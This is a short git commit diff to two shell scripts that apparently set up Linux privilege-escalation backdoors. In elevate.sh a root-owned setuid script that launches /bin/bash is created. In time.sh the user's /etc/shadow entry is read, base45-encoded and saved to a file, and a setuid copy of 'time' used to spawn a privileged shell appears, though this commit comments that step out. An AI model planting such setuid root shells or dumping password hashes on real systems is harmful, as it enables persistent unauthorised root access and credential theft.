e88d41e4367c3c26c46774ae5621dca5a09db4aa
Maciej Rutkowski <maciej.rutkowsky@gmail.com>
2024-11-13 00:36:45 +0100

    Updates and scripts

--- scripts/elevate.sh
+++ scripts/elevate.sh
@@ -1,9 +1,10 @@
 sudo touch /usr/local/bin/escalate.sh
 sudo nano /usr/local/bin/escalate.sh
 
-# /usr/local/bin/escalate.sh
+# /usr/local/bin/escalate.sh file content
 #!/bin/bash
 /bin/bash
+# end of content
 
 sudo chown root:root /usr/local/bin/escalate.sh
 sudo chmod 4755 /usr/local/bin/escalate.sh
--- scripts/time.sh
+++ scripts/time.sh
@@ -16,6 +16,6 @@ pip3 install base45 # or pip3 install base45 --break-system-packages
 sudo grep $USER /etc/shadow | python3 -c "import base45, sys; print(base45.b45encode(sys.stdin.read().encode()).decode())" > secret.txt
 
 #exploit (in home dir of the user)
-sudo install -m =xs $(which time) .
+# sudo install -m =xs $(which time) .
 
-./time /bin/sh -p
+# ./time /bin/sh -p
